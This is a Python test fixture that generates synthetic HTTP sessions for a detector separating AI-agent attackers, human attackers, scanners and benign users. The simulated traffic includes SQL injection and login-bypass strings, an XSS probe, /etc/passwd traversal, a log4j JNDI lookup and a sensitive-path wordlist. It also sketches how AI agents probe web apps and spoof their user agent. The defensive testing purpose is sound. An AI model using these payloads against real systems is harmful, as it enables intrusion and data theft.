"""Deterministic synthetic actor sessions for tests (independent of the lab-eval simulator).

Each generator returns a time-ordered list of HTTP ``Event`` objects for ONE actor. Payloads are inert detection
strings only. The shapes encode the hypotheses in docs/detection/ai-attacks.md:

- ``ai_agent``        python-httpx, JS/OpenAPI/robots fetch -> burst of discovered routes -> thinking gap ->
                      error-driven payload mutation chains (some with explanatory comments)
- ``ai_agent_stealth`` same behaviour but browser UA spoofed with a library header set and no prose in payloads
- ``human``           real browser (Firefox) browsing with assets, then a handful of manual payloads, long gaps
- ``scanner``         nuclei UA, constant high rate over a wordlist, mostly 404, reflexive payload list
- ``scanner_generic`` same as scanner with a generic Go client UA (timing/404 pattern must carry the verdict)
- ``benign``          Chrome browsing: pages + asset bursts + XHR with Referer, reading pauses
"""

from __future__ import annotations

import json
import random
from collections.abc import Callable
from datetime import UTC, datetime, timedelta

from tokiwa.schemas.events import Endpoint, Event, EventKind, HttpInfo

T0 = datetime(2026, 10, 22, 1, 0, 0, tzinfo=UTC)

CHROME_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
FIREFOX_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
HTTPX_UA = "python-httpx/0.27.2"
NUCLEI_UA = "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))"
GO_UA = "Go-http-client/1.1"


def chrome_headers(ua: str = CHROME_UA) -> dict[str, str]:
    return {
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "ja,en-US;q=0.9,en;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }


def firefox_headers() -> dict[str, str]:
    return {
        "user-agent": FIREFOX_UA,
        "accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.5",
        "accept-encoding": "gzip, deflate",
        "connection": "keep-alive",
    }


def library_headers(ua: str) -> dict[str, str]:
    return {"user-agent": ua, "accept": "*/*", "accept-encoding": "gzip, deflate", "connection": "keep-alive"}


class _Builder:
    def __init__(self, ip: str, headers: dict[str, str], seed: int, scheme: str = "http") -> None:
        self.ip = ip
        self.headers = headers
        self.rng = random.Random(seed)
        self.t = T0
        self.scheme = scheme
        self.events: list[Event] = []

    def wait(self, lo: float, hi: float) -> None:
        self.t += timedelta(seconds=self.rng.uniform(lo, hi))

    def req(
        self,
        path: str,
        *,
        status: int = 200,
        method: str = "GET",
        query: str | None = None,
        body: str | None = None,
        content_type: str | None = None,
        referer: str | None = None,
        extra_headers: dict[str, str] | None = None,
    ) -> Event:
        headers = dict(self.headers)
        if referer:
            headers["referer"] = referer
        if content_type:
            headers["content-type"] = content_type
        if extra_headers:
            headers.update(extra_headers)
        ev = Event(
            timestamp=self.t,
            kind=EventKind.HTTP,
            dataset="gate.http",
            source=Endpoint(ip=self.ip, port=40000 + len(self.events)),
            destination=Endpoint(ip="10.0.0.5", port=8080),
            http=HttpInfo(
                method=method,
                scheme=self.scheme,
                host="app.lab",
                path=path,
                query=query,
                headers=headers,
                header_order=list(headers),
                user_agent=headers.get("user-agent"),
                referrer=referer,
                content_type=content_type,
                request_body=body,
                request_body_size=len(body) if body else 0,
                status=status,
            ),
        )
        self.events.append(ev)
        return ev


def _agent(seed: int, ip: str, headers: dict[str, str], *, prose: bool) -> list[Event]:
    b = _Builder(ip, headers, seed)
    r = b.rng
    # 1) discovery burst (parallel tool calls)
    for p in ("/", "/robots.txt", "/openapi.json", "/static/js/main.3f9a1c.js", "/static/js/vendor.8b2d.js"):
        b.req(p)
        b.wait(0.01, 0.06)
    b.wait(3, 12)
    # 2) burst of discovered routes
    for p, st in (("/api/v1/products", 200), ("/api/v1/users/me", 401), ("/api/v1/orders", 401)):
        b.req(p, status=st)
        b.wait(0.01, 0.08)
    b.wait(3, 12)
    for p in ("/api/v1/categories", "/api/v1/products/1", "/api/v1/reviews"):
        b.req(p)
        b.wait(0.01, 0.08)
    b.wait(4, 14)
    # 3) error-driven mutation chain on the search parameter
    chain = [
        ("search=laptop%27", 500),
        (
            "search=laptop%27%20OR%20%271%27%3D%271%27%20--%20check%20whether%20the%20search%20parameter%20is%20injectable"
            if prose
            else "search=laptop%27%20OR%20%271%27%3D%271%27--",
            500,
        ),
        ("search=laptop%2527%2520OR%25201%253D1--", 403),
        ("search=laptop%27))%20OR%201%3D1--", 500),
        ("search=laptop%27%20UNION%20SELECT%20NULL,NULL--", 200),
    ]
    for q, st in chain:
        b.req("/api/v1/products", query=q, status=st)
        b.wait(2.5, 11)
    # 4) parallel probes on a path parameter, then think
    b.req("/api/v1/products/1'", status=500)
    b.wait(0.01, 0.05)
    b.req("/api/v1/products/1%20AND%201=1", status=200)
    b.wait(3, 10)
    # 5) login bypass attempts (JSON body), error-driven
    logins = [
        ({"username": "admin' --", "password": "x"}, 401),
        (
            {
                "username": "admin'/* verify that the login form can be bypassed with a comment */--",
                "password": "x",
            }
            if prose
            else {"username": "admin'/**/--", "password": "x"},
            500,
        ),
        ({"username": "admin' OR '1'='1", "password": "x' OR '1'='1"}, 401),
        ({"username": "admin'||'1'='1'#", "password": "x"}, 200),
    ]
    for body, st in logins:
        b.req(
            "/api/v1/login", method="POST", body=json.dumps(body), content_type="application/json", status=st
        )
        b.wait(2.0, 9)
    # 6) another burst of follow-up calls
    for p in ("/api/v1/admin/users", "/api/v1/admin/settings", "/api/v1/export"):
        b.req(p, status=r.choice([200, 403]))
        b.wait(0.01, 0.07)
    return b.events


def ai_agent(seed: int = 1, ip: str = "198.51.100.7") -> list[Event]:
    return _agent(seed, ip, library_headers(HTTPX_UA), prose=True)


def ai_agent_stealth(seed: int = 1, ip: str = "198.51.100.8") -> list[Event]:
    return _agent(seed, ip, library_headers(CHROME_UA), prose=False)


def human(seed: int = 1, ip: str = "203.0.113.20") -> list[Event]:
    b = _Builder(ip, firefox_headers(), seed)
    prev = None
    for page in ("/", "/products", "/products/12", "/search"):
        b.req(page, referer=prev)
        b.wait(0.05, 0.15)
        for asset in ("/static/app.js", "/static/app.css", "/static/logo.png"):
            b.req(asset, referer=f"http://app.lab{page}", status=b.rng.choice([200, 304]))
            b.wait(0.02, 0.09)
        prev = f"http://app.lab{page}"
        b.wait(15, 70)
    attempts = [
        ("/search", "q=test%27", None, 500),
        ("/search", "q=test%27%20OR%20%271%27%3D%271", None, 200),
        ("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", None, 200),
        ("/products", "id=1%20UNION%20SELECT%20username,password%20FROM%20users--", None, 500),
        ("/login", None, "username=admin%27--&password=x", 401),
        ("/search", "q=..%2F..%2F..%2Fetc%2Fpasswd", None, 200),
    ]
    for path, q, body, st in attempts:
        if body:
            b.req(
                path,
                method="POST",
                body=body,
                content_type="application/x-www-form-urlencoded",
                referer=prev,
                status=st,
            )
        else:
            b.req(path, query=q, referer=prev, status=st)
        b.wait(20, 90)
    return b.events


_WORDLIST = [
    "admin",
    ".env",
    "wp-login.php",
    "backup.zip",
    "phpinfo.php",
    ".git/config",
    "server-status",
    "config.php",
    "db.sql",
    "test",
    "old",
    "dev",
    "api/debug",
    "actuator/health",
    ".DS_Store",
    "id_rsa",
    "console",
    "manager/html",
    "cgi-bin/test.cgi",
    "robots.txt",
]
_SCANNER_PAYLOADS = [
    "q=%3Cscript%3Ealert(1)%3C/script%3E",
    "q=%27%20OR%201%3D1--",
    "q=%7B%7B7*7%7D%7D",
    "q=..%2F..%2F..%2Fetc%2Fpasswd",
    "q=%24%7Bjndi:ldap://x/a%7D",
    "q=1%20AND%20SLEEP(5)",
]


def _scanner(seed: int, ip: str, headers: dict[str, str]) -> list[Event]:
    b = _Builder(ip, headers, seed)
    r = b.rng
    for i in range(150):
        if i % 25 == 24:
            for q in _SCANNER_PAYLOADS:
                b.req("/search", query=q, status=r.choice([200, 400, 500]))
                b.wait(0.02, 0.06)
            continue
        word = _WORDLIST[i % len(_WORDLIST)]
        path = f"/{word}" if i < len(_WORDLIST) else f"/{word}{i}"
        st = 404 if r.random() < 0.88 else r.choice([200, 403, 301])
        b.req(path, status=st)
        b.wait(0.0, 0.06)
    return b.events


def scanner(seed: int = 1, ip: str = "192.0.2.50") -> list[Event]:
    return _scanner(seed, ip, library_headers(NUCLEI_UA))


def scanner_generic(seed: int = 1, ip: str = "192.0.2.51") -> list[Event]:
    return _scanner(seed, ip, {"user-agent": GO_UA, "accept-encoding": "gzip"})


def benign(seed: int = 1, ip: str = "203.0.113.30") -> list[Event]:
    b = _Builder(ip, chrome_headers(), seed)
    r = b.rng
    pages = ["/", "/products", "/products/12", "/cart", "/about", "/search", "/products/7", "/"]
    prev = None
    for page in pages:
        b.req(page, referer=prev)
        b.wait(0.03, 0.12)
        ref = f"http://app.lab{page}"
        for asset in ("/static/app.4f2e.js", "/static/app.9c1a.css", "/static/img/logo.png", "/favicon.ico"):
            st = 404 if asset == "/favicon.ico" and page == "/" and prev is None else r.choice([200, 304])
            b.req(asset, referer=ref, status=st)
            b.wait(0.01, 0.06)
        if page == "/search":
            b.req("/api/search", query="q=wireless+noise+cancelling+headphones", referer=ref)
        else:
            b.req("/api/products", query=f"page={r.randint(1, 4)}", referer=ref)
        b.wait(0.05, 0.2)
        b.req("/api/cart/count", referer=ref)
        prev = ref
        b.wait(6, 50)
    return b.events


GENERATORS: dict[str, Callable[..., list[Event]]] = {
    "ai_agent": ai_agent,
    "ai_agent_stealth": ai_agent_stealth,
    "human": human,
    "scanner": scanner,
    "scanner_generic": scanner_generic,
    "benign": benign,
}

EXPECTED: dict[str, str] = {
    "ai_agent": "ai_agent",
    "ai_agent_stealth": "ai_agent",
    "human": "human",
    "scanner": "automated_scanner",
    "scanner_generic": "automated_scanner",
    "benign": "benign",
}
